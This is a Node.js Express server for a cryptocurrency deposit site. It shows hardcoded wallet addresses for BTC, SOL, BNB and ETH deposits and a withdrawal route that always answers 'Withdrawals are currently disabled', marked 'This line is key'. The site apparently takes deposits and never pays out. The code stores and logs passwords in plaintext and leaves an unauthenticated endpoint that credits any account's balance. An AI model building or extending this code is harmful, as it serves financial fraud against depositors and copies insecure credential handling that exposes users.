import express from "express";
import bodyParser from "body-parser";
import fetch from "node-fetch";
import path from "path"
import pg from 'pg';
import { fileURLToPath } from "url";
import dotenv from "dotenv";
dotenv.config();
import pkg from 'pg-connection-string';
const { parse } = pkg;

const app = express();
app.set("view engine", "ejs")
const port = process.env.PORT || 3000
const __filename = fileURLToPath (import.meta.url)
const __dirname = path.dirname(__filename)
//const prices = await getCryptoPrices()


// Force IPv4

const db = new Client({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  },
  family: 4  // Optional: only if needed
});

db.connect((err) => {
  if (err) {
    console.error("❌ Failed to connect to database:", err.stack);
  } else {
    console.log("✅ Connected to database");
  }
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.render("home.ejs");
});

app.get("/login", (req, res) => {
  res.render("login.ejs");
});

app.get("/register", (req, res) => {
  res.render("register.ejs");
});



  

     
      app.post("/register", async (req, res) => {
  const name = req.body.name;
  const email = req.body.username;
  const password = req.body.password;

  console.log("➡️ Register attempt:", { name, email, password });

  try {
    console.log("🔍 Checking if user exists...");
    const checkResult = await db.query("SELECT * FROM users WHERE email = $1", [email]);
    console.log("✅ Check complete:", checkResult.rows.length);

    if (checkResult.rows.length > 0) {
      return res.send("Email already exists. Try logging in.");
    }

    console.log("📝 Inserting new user...");
    const result = await db.query(
      "INSERT INTO users (email, password, full_name) VALUES ($1, $2, $3) RETURNING *",
      [email, password, name]
    );
    const user = result.rows[0];

    console.log("✅ Inserted user:", user);

    res.render("secrets.ejs", {
      name: user.full_name,
      email: user.email,
      balance: user.balance || 0,
      paymentStatus: 'none',
      btc: user.btc_balance || 0,
      sol: user.sol_balance || 0,
      eth: user.eth_balance || 0,
      bnb: user.bnb_balance || 0,
      btcAmount: null,
      btcAddress: null,
      solAmount: null,
      solAddress: null,
      ethAmount: null,
      ethAddress: null,
      bnbAmount: null,
      bnbAddress: null,
      prices: await getCryptoPrices()
    });

  } catch (err) {
    console.error("❌ REGISTER ERROR:", err.stack);
    res.status(500).send("Server error: " + err.message);
  }
});

app.post("/login", async (req, res) => {
  const email = req.body.username;
  const password = req.body.password;

  console.log("➡️ Login attempt:", { email, password });

  try {
    const result = await db.query("SELECT * FROM users WHERE email = $1", [email]);
    console.log("🔍 User lookup result:", result.rows);

    if (result.rows.length > 0) {
      const user = result.rows[0];
      const storedPassword = user.password;

      if (password === storedPassword) {
        const prices = await getCryptoPrices();
        console.log("✅ Login success, rendering secrets page");

        res.render("secrets.ejs", {
          name: user.full_name,
          email: email,
          balance: user.balance,
          paymentStatus: 'none',
          btc: user.btc_balance,
          sol: user.sol_balance,
          eth: user.eth_balance,
          bnb: user.bnb_balance,
          btcAmount: null,
          btcAddress: null,
          solAmount: null,
          solAddress: null,
          ethAmount: null,
          ethAddress: null,
          bnbAmount: null,
          bnbAddress: null,
          prices: prices
        });
      } else {
        console.log("❌ Incorrect password");
        res.send("Incorrect Password");
      }
    } else {
      console.log("❌ User not found");
      res.send("User not found");
    }
  } catch (err) {
    console.error("❌ LOGIN ERROR:", err);
    res.status(500).send("Server error: " + err.message);
  }
});

app.post("/start-btc-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      btcAmount: amount,
      btcAddress: "bc1q87yng5l9kyl7390gm80nreq2qmw3v7f0ryx699"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting BTC payment.");
  }
});

app.post("/start-sol-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      solAmount: amount,
      solAddress: "9D8d3DL9sYSHU9VVnateJEeosKg31MZNPNMJxMWkAs13"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting SOL payment.");
  }
});

app.post("/start-bnb-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      bnbAmount: amount,
      bnbAddress: "0x497785495154a4D919Cd0aA047Fc23a778bd6337"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting BNB payment.");
  }
});


app.post("/start-eth-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update user status to 'processing'
    await db.query(
      "UPDATE users SET payment_status = 'processing' WHERE email = $1",
      [email]
    );

    const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    res.render("secrets.ejs", {
      name: user.rows[0].full_name,
      email: user.rows[0].email,
      balance: user.rows[0].balance,
      paymentStatus: 'processing',
      ethAmount: amount,
      ethAddress: "0x497785495154a4D919Cd0aA047Fc23a778bd6337"
    });

  } catch (err) {
    console.error(err);
    res.send("Error starting ETH payment.");
  }
});

app.post("/approve-payment", async (req, res) => {
  const { email, amount } = req.body;

  try {
    // Update balance and mark payment as confirmed
    await db.query("UPDATE users SET balance = balance + $1, payment_status = 'confirmed' WHERE email = $2", [
      amount,
      email
    ]);

    const updatedUser = await db.query("SELECT * FROM users WHERE email = $1", [email]);
    const prices = await getCryptoPrices();
    res.render("secrets.ejs", {
      name: updatedUser.rows[0].full_name,
      email: updatedUser.rows[0].email,
      balance: updatedUser.rows[0].balance,
      paymentStatus: 'confirmed'
    });

  } catch (err) {
    console.error(err);
    res.send("Error approving payment.");
  }
});


async function getCryptoPrices() {
  try {
    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd");
    const data = await response.json();
    return {
      btc: data.bitcoin.usd,
      eth: data.ethereum.usd,
      sol: data.solana.usd,
      bnb: data.binancecoin.usd
    };
  } catch (error) {
    console.error("Error fetching prices:", error);
    return {
      btc: 0,
      eth: 0,
      sol: 0,
      bnb: 0
    };
  }
}
app.post("/withdraw", async (req, res) => {
  const email = req.body.email;

  try {
    const result = await db.query("SELECT * FROM users WHERE email = $1", [email]);

    if (result.rows.length > 0) {
      const user = result.rows[0];
      const prices = await getCryptoPrices();

      res.render("secrets.ejs", {
        name: user.full_name,
        email: user.email,
        balance: user.balance,
        paymentStatus: user.payment_status,
        btc: user.btc_balance,
        sol: user.sol_balance,
        eth: user.eth_balance,
        bnb: user.bnb_balance,
        btcAmount: null,
        btcAddress: null,
        solAmount: null,
        solAddress: null,
        ethAmount: null,
        ethAddress: null,
        bnbAmount: null,
        bnbAddress: null,
        prices: prices,
        errorMessage: "Withdrawals are currently disabled." // 👈 This line is key
      });
    } else {
      res.send("User not found.");
    }
  } catch (err) {
    console.error(err);
    res.send("Error processing withdrawal.");
  }
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server running on port ${port}`);
});
